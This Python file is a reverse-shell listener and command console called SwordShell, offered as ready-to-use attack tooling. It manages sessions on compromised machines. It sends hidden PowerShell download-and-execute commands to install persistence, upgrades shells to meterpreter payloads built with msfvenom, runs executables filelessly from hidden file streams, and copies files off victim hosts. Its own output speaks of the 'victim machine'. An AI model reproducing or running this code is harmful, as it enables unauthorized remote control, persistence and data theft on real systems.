import socket
import subprocess
import sys
import time
import threading
import io
import os
import colorama
from colorama import Fore, Back, Style
import signal
import random
import select
import argparse
import readline
import http.server
import socketserver
import base64
import requests
import os
import tempfile
from http.server import HTTPServer, SimpleHTTPRequestHandler

from ssl import SSLContext, PROTOCOL_TLS
import ssl

banners = [
    '''
      (;)
      (;)
      (;)
   .  (;)  .
   )\_(;)_/(

  / / )|( \ \ 
  |/ ( o ) \|
      )8(
     ( o\\
      )8 \\
     //o|\))
    //|8|\(
   ((/ o||
    )/|8||  
      |o||/\ 
     /|8||/\\
     ||o\/ ||
     |/\   ||           
   /\  ) . ||
  (/\\//||\/|
  (| \/ ||\/
   \\   ||
    \\  ||         "shell fragments can be deadly"
     \\ //
      \V/
       V
''',
    '''
               /\)
              /\/
             /\/
           _/L/
          (/\_)
          /%/  
         /%/  
        /%/
       /%/
      /%/
     /%/
    /%/
   /%/
  /%/
 /%/           "Be fast, Be silent, Be deadly"
/,' 
"
''',


    '''
                                ,-.
                               ("O_)
                              / `-/
                             /-. /
                            /   )
                           /   /  
              _           /-. /
             (_)"-._     /   )
               "-._ "-'""( )/    
                   "-/"-._" `. 
                    /     "-.'._
                   /\       /-._"-._
    _,---...__    /  ) _,-"/    "-(_)
___<__(|) _   ""-/  / /   /
 '  `----' ""-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-""      __.,'/   /   ___                 /,
  /    ,--""/  / /   /,-""   """-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  """ ,-'
   `-._  /  / /   /_,'            ""--"
       "/  / /   /"         
       /  / /   /
      /  / /   /  o!O
     /  |,'   /  
    :   /    /
    [  /   ,'   "serving Justice, many shells at a time"
    | /  ,'
    |/,-'
    P'
''',
  """
        )         
          (            
        '    }      
      (    '      
     '      (   
      )  |    ) 
    '   /|\    `
   )   / | \  ` )   
  {    | | |  {   
 }     | | |  .
  '    | | |    )
 (    /| | |\    .
  .  / | | | \  (
}    \ \ | / /  .        
 (    \ `-' /    }
 '    / ,-. \    ' 
  }  / / | \ \  }
 '   \ | | | /   } 
  (   \| | |/  (
    )  | | |  )
    .  | | |  '
       J | L              "fire in the shell
 /|    J_|_L    |\
 \ \___/ o \___/ /    
  \_____ _ _____/
        |-|
        |-|
        |-|
       ,'-'.
       '---'
  """,

    """
        __                                           __
       (**)                                         (**)
       IIII                                         IIII
       ####                                         ####
       HHHH                                         HHHH
       HHHH                                         HHHH
       ####                                         ####
    ___IIII___                                      IIII___
 .-`_._"**"_._`-.                             .-`_._"**"_._`-.
|/``  .`\/`.  ``\|                           |/``  .`\/`.  ``\|
`     }    {     '                           `     }    {     '
      ) () (                                       ) () (
      ( :: )            swords of shells           ( :: )
      | :: |                                       | :: |
      | )( |                                       | )( |
      | || |                                       | || |
      | || |                                       | || |
      | || |                                       | || |
      | || |                                       | || |
      | || |                                       | || |
      ( () )                                       ( () )
       \  /                                         \  /
        \/                                           \/
    """,
    """
            |\
            | | /|
            |  V |
            |    |              
    1       |    |       1
    8b      |    |      d8
    88b   ,%|    |%,   d88
    888b%%%%|    |%%%%d888
     "Y88888[[[]]]88888Y"
            [[[]]]
            [[[]]]-.               "not a weapon ,just a tool"   
           _[[[]]]> "\   _____
          (_______    "-( * * )----
         (________       | Y |
         (_________    _(_____)____
          (________,_/"
            ||||||
            {{{}}}
           {{{{}}}}
            {{{}}}
              ()
    """
 
]

colors = [
    '\033[31m',  # Red
    '\033[32m',  # Green
    '\033[33m',  # Yellow
    '\033[35m',  # Purple
    '\033[33m',
    '\033[37m',  # White
    '\033[36m',  # Cyan,  # Orange (ANSI doesn't support orange, so we use yellow instead)
]
commands = """
Commands:
  help          - Show this help menu
  list        - List all sessions
  session <id> - Interact with a session
  upgrade <id> - Upgrade a shell to a meterpreter shell (require metasploit)
  exec <id> <url> <TYPE> - Execute a PE file in memory filelessly  (EXE, DLL) , no GUI !
  persist <id> - Persist a shell using keres(persistance module) 
  upload <id> <file_path> - Upload a file to the target machine
  download <id> <file_path> - Download a file from the target machine
  exit | Ctrl +c*2    - Exit SwordShell
"""
# Clear the terminal screen
os.system('cls' if os.name == 'nt' else 'clear')

# Print the ASCII art banner
print(random.choice(colors) + random.choice(banners) +"\n" +'\033[0m' + commands)  # '\033[0m' resets the color# def shellreceiver(conn):

parser = argparse.ArgumentParser(description="Run the Swordshell program.")

# Add the arguments
parser.add_argument('-host', type=str, default='0.0.0.0', help='host ip.')
parser.add_argument('-port', type=int, default=5555, help='The port to listen on.')
parser.add_argument('-http-server-port', type=int, default=8585, help='The port to connect to.')
parser.add_argument('-https-server-port', type=int, default=8443, help='The port to connect to.')
# Parse the arguments
args = parser.parse_args()

# Use the arguments
https_server_port = args.https_server_port
host = args.host
port = args.port
http_server_port = args.http_server_port
class QuietHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return
def start_http_server(port=8585):
    handler = QuietHTTPRequestHandler
    try:
        httpd = socketserver.TCPServer(("", port), handler)
        print(f"HTTP server is starting at port {port}")
        httpd.serve_forever()
    except OSError as e:
        if e.errno == 98:  # Address already in use
            return
        else:
            raise e
        

def start_https_server():
    LISTEN_IP = get_my_ip()
    LISTEN_PORT = 8443

    with tempfile.TemporaryDirectory() as temp_dir:
        key_file = os.path.join(temp_dir, 'k')
        cert_file = os.path.join(temp_dir, 'c')

        # Generate a self-signed certificate
        os.system(f'openssl req -x509 -newkey rsa:3072 -nodes -keyout {key_file} -out {cert_file} -sha256 -days 5 -subj "/CN=localhost"')

        class BasicAuthHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                SimpleHTTPRequestHandler.do_GET(self)

            # Suppress log messages
            def log_message(self, format, *args):
                return

        context = SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=cert_file, keyfile=key_file)

        SERVER = HTTPServer((LISTEN_IP, LISTEN_PORT), BasicAuthHandler)
        SERVER.socket = context.wrap_socket(SERVER.socket, server_side=True)        
        print(f'Serving HTTPS on {LISTEN_IP} port {LISTEN_PORT} ...')

        try:
            SERVER.serve_forever()
        except KeyboardInterrupt:
            pass
        sys.stderr = open(os.devnull, 'w') 
        # Clean up
        os.system(f'shred {key_file} || true')

def persist_shell(conn, addr, shell_id):
    # Read the PowerShell script from the file
    with open('keres.ps1', 'r') as file:
        ps_script = file.read()

    # Replace the server address and port
    ps_script = ps_script.replace('server_address', get_my_ip())
    ps_script = ps_script.replace('port_number', '5555')
    with open('persist.ps1', 'w') as save:
        save.write(ps_script)
    url = f"https://{get_my_ip()}:8443/persist.ps1"
    # Convert the script to a base64 string
    command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex ((iwr -Uri {url}).Content)"'
    #iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1') 
    # Create the PowerShell command
    print("\033[91m[*] Executing Keres in memory ..... \033[0m")
    # Execute the command on shell 
    conn.send(command.encode())
    time.sleep(2)
    print(f"[*] Persisted rev-shell {shell_id} from IP {addr}")
    print("\033[91m[*] you will get a persistant powershell rev-shell at next startup of victim machine ;) \033[0m")
def upgrade_shell(conn,addr, shell_id):
    # Start HTTP server in a new thread

    print("\033[91m[*] Upgrading shell to meterpreter shell ..... \033[0m")
    subprocess.run(["msfvenom", "-p", "windows/x64/meterpreter_reverse_tcp", f"lhost={get_my_ip()}", "lport=4444", "-f", "exe", "-o", "./meter/https.exe"])    
    print("\033[91mgenerated meterpreter payload")
    
    command = f"""cmd /c "cd %TEMP% && IF NOT EXIST curl https://{get_my_ip()}:8443/exec.exe -OJ && exec.exe https://{get_my_ip()}:8443/meter/https.exe EXE" """
    conn.send(command.encode())
    print("Host : "+get_my_ip() + " Port : 4444")
    time.sleep(2)   
    print(f"Upgraded shell {shell_id} from IP {addr} to a meterpreter shell")
    print("run metasploit listener with the following commands: \033[0m")
    print("     use exploit/multi/handler")
    print("     set payload windows/x64/meterpreter_reverse_tcp")
    print("     set lhost 0.0.0.0")
    print("     set lport 4444")
    print("     exploit")

def exec_shell(conn, addr, shell_id, url, type,func=""):

    if func != "":
        func = "--Method " + func

    print("\033[94m[*] Executing PE Filelessly in memory on shell {shell_id} from IP {addr}")
    command = f"""cmd.exe /c  "IF NOT EXIST %TEMP%\sys.m:_.exe curl https://{get_my_ip()}:8443/exec.exe -o %TEMP%\sys.m:_.exe && cd %TEMP% && powershell.exe -windowstyle hidden -c .\sys.m:_.exe {url} {type} {func}" """
    conn.send(command.encode())
    
    time.sleep(2)
    print(command)
    print("[*] DONE\033[0m")

def get_my_ip(host=None):
    if host and host != '0.0.0.0':
        return host

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def handle_client(conn, addr):
    shell_type, os_type = get_shell_type(conn)
    
    print(Fore.GREEN, f'\n[*] Connecting to session: {addr[0]}:{addr[1]}', Fore.WHITE)
    print(f"Connected to a {shell_type} shell on a {os_type} system.")
    print(f'\n[*] press Ctrl+c to go back ', Fore.WHITE)
    conn.send("\n".encode())
    while True:
        read_sockets, _, _ = select.select([conn, sys.stdin], [], [], 1)

        for sock in read_sockets:
            try:
                if sock == conn:
                    data = conn.recv(1024)
                    if not data:
                        print("\033[91m connection to " + addr[0] + " lost\033[0m")
                        remove_connection(conn)
                        break
                    print(data.decode(), end="")
                else:
                    mycmd = input()
                    #mycmd = mycmd + "\n"
                    conn.send(mycmd.encode())
            except ConnectionError:
                print("\033[91mconnection to " + addr[0] + " lost\033[0m")
                remove_connection(conn)
                break

print(Fore.YELLOW + "[+] Your local IP : "+get_my_ip(), Fore.WHITE)
print(Fore.YELLOW + "[+] Your public IP : "+requests.get('https://api.ipify.org').text, Fore.WHITE)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

connections = []

def remove_connection(conn):
    global connections
    connections = [(c, addr) for c, addr in connections if c != conn]

def get_shell_type(conn):
    try:
    # Send a command to check if it's a PowerShell or CMD shell
        conn.sendall('echo $PSVersionTable.PSVersion'.encode())
        response = conn.recv(1024).decode().strip().lower()
        if 'major' in response:
            return 'powershell', 'windows'

        # If it's not PowerShell, check if it's a CMD shell
        conn.sendall('ver'.encode())
        response = conn.recv(1024).decode().strip().lower()
        if 'windows' in response:
            return 'cmd', 'windows'

        # If it's not PowerShell or CMD, check if it's a Bash shell
        conn.sendall('echo $BASH_VERSION'.encode())
        response = conn.recv(1024).decode().strip().lower()
        if 'bash' in response:
            return 'bash', 'unix'
    except BrokenPipeError:
        print("Connection lost or shell closed. Please check the connection.")
    # If none of the above checks succeed, return unknown
    return 'unknown', 'unknown'


def accept_connections():
    while True:
        conn, addr = s.accept()
        ip_connections = [connection for connection in connections if connection[1][0] == addr[0]]
        if len(ip_connections) < 3:
            connections.append((conn, addr))
            shell_type, os_type = get_shell_type(conn)
            
            print(f"{Fore.GREEN}\n\033[94m[*] Accepted new connection from: \033{Fore.YELLOW}{addr[0]}{Fore.GREEN}:{addr[1]}{Fore.WHITE} PL: "
      f"{Fore.CYAN if os_type == 'windows' else Fore.YELLOW}{os_type}"
      f"{Fore.BLUE if shell_type == 'powershell' else Fore.LIGHTBLACK_EX if shell_type == 'cmd' else Fore.LIGHTYELLOW_EX} {shell_type} shell{Fore.WHITE}")
        else:
            #print(Fore.RED + '\n[*] Connection limit reached for: ' + Fore.YELLOW + f'{addr[0]}' + Fore.RED + Fore.WHITE)
            conn.close()
# Create a new thread that will run the accept_connections function
accept_thread = threading.Thread(target=accept_connections)
# Start the new thread
accept_thread.start()

def upload_file(conn, file_path):
    try:
        

        # Send a command to the reverse shell to write the file

        conn.sendall(f"""curl  https://{get_my_ip()}:8443/{file_path} -OJ""")

        print(f"File {file_path} uploaded successfully.")
    except FileNotFoundError:
        print(f"File {file_path} not found.")
    except Exception as e:
        print(f"An error occurred while uploading the file: {e}")

def download_file(conn, file_path):
    try:
        conn.sendall('uname'.encode())
        os_type = conn.recv(1024).decode().strip().lower()
        if 'command not found' in os_type or 'not recognized' in os_type:
            os_type = 'windows'
        else:
            os_type = 'unix'

        # Send a command to the reverse shell to read the file
        if os_type == 'windows':
            conn.sendall(f'powershell -command "[convert]::ToBase64String([IO.File]::ReadAllBytes(\'{file_path}\'))"'.encode())
        else:  # Assume Unix-like system
            conn.sendall(f'base64 {file_path}'.encode())

        # Receive the file data from the reverse shell
        with open(file_path, 'wb') as file:
            data_received = []
            while True:
                conn.settimeout(5.0)  # Set a timeout of 5 seconds
                try:
                    data = conn.recv(1024)
                    if not data:
                        break
                    data_received.append(data)
                except socket.timeout:
                    print("No data received for 5 seconds, stopping download.")
                    break

            # Ignore the last line of the output (the prompt)
            file.write(b'\n'.join(data_received[:-1]))

        print(f"File {file_path} downloaded successfully.")
    except Exception as e:
        print(f"An error occurred while downloading the file: {e}")

# This function will be called when the alarm signal is raised
def handler(signum, frame):
     pass

# Set the signal handler
signal.signal(signal.SIGALRM, handler)
first_press_time = None
http_server_thread = threading.Thread(target=start_http_server)
http_server_thread.daemon = True
http_server_thread.start()
https_server_thread = threading.Thread(target=start_https_server)
https_server_thread.daemon = True
https_server_thread.start()
ctrl_c_count = 0
session_started = False
while True:
    
    signal.alarm(1)
   
    try:
        
        
        while True:
            if not session_started:
                command = input(Fore.YELLOW + "\n-{-->> " + Fore.GREEN)
                readline.add_history(command)
                if command.startswith('upload '):
                    parts = command.split()
                    if len(parts) < 3:
                        print("Invalid command. Usage: upload <id> <file_path>")
                        continue
                    shell_id = parts[1]
                    file_path = parts[2]
                    session = int(shell_id) - 1
                    conn, addr = connections[session]
                    upload_file(conn, file_path)
                if command.startswith('download '):
                    parts = command.split()
                    if len(parts) < 3:
                        print("Invalid command. Usage: download <id> <file_path>")
                        continue
                    shell_id = parts[1]
                    file_path = parts[2]
                    session = int(shell_id) - 1
                    conn, addr = connections[session]
                    download_file(conn, file_path)
                if command.startswith('persist '):
                    shell_id = command.split()[1]
                    session = int(command.split(' ')[1]) - 1
                    conn, addr = connections[session]  # Get the shell ID from the command
                    persist_shell(conn, addr, shell_id)
                if command.startswith('upgrade '):
                    shell_id = command.split()[1]
                    session = int(command.split(' ')[1]) - 1
                    conn, addr = connections[session]  # Get the shell ID from the command
                    upgrade_shell(conn, addr, shell_id)
                if command.strip() == '':
                     break
                if command.strip() == 'help':
                     print(commands)
                     break
                if command.startswith('exec '):
                    parts = command.split()
                    if len(parts) < 4:
                        print("Invalid command. Usage: exec <id> <url> <TYPE>")
                        print("example : exec 2 http://payload.com/evil.exe  EXE")
                        print("example : exec 2 http://payload.com/evil.dll  DLL --Method DLLRegisterServer")
                        continue

                    shell_id = parts[1]
                    url = parts[2]
                    type = parts[3]
                    session = int(shell_id) - 1
                    print(url,type)
                    conn, addr = connections[session]  # Get the shell ID from the command
                    exec_shell(conn, addr, shell_id, url,type)     
                if command == 'list':
                    print("\nAvailable rev-shell sessions:")
                    print("ID | IP:Port             | Platform | Shell Type")
                    print("--------------------------------------------------")
                    for i, connection in enumerate(connections):
                        shell_type, os_type = get_shell_type(connection[0])  # Assuming connection[0] is the conn object
                        os_color = Fore.CYAN if os_type == 'windows' else Fore.YELLOW
                        shell_color = Fore.BLUE if shell_type == 'powershell' else Fore.LIGHTBLACK_EX if shell_type == 'cmd' else Fore.LIGHTYELLOW_EX
                        
                        print(f"\033[91m{i+1}\033[0m | {connection[1][0]}:{connection[1][1]} | {os_color}{os_type}\033[0m | {shell_color}{shell_type}\033[0m")
                    break
                elif command.startswith('session '):
                    try:
                        session_started = True
                        session = int(command.split(' ')[1]) - 1
                        conn, addr = connections[session]
                       
                       
                        try:
                            while session_started==True:
                                handle_client(conn,addr)
                        except KeyboardInterrupt:
                            print("Session Paused. Returning to menu.")
                            session_started = False
                            break
                    except ValueError:
                        print("No session provided. Please provide a valid session number.")
                    break
                elif command == 'exit':
                    print("Exiting listener.")
                    os._exit(0)
    except KeyboardInterrupt:
        ctrl_c_count += 1
        if ctrl_c_count >= 2:
            second_press_time = time.time()
            if second_press_time - first_press_time <= 2:
                print("\n[*] Ctrl+C pressed twice within 2 seconds. Exiting listener.")
                os._exit(0)
            else:
                ctrl_c_count = 1  # Reset the count if more than 2 seconds have passed
        else:
            session_started = False

            first_press_time = time.time()  # Record the time of the first press
            continue
    finally:
        # Cancel the alarm
        signal.alarm(0)
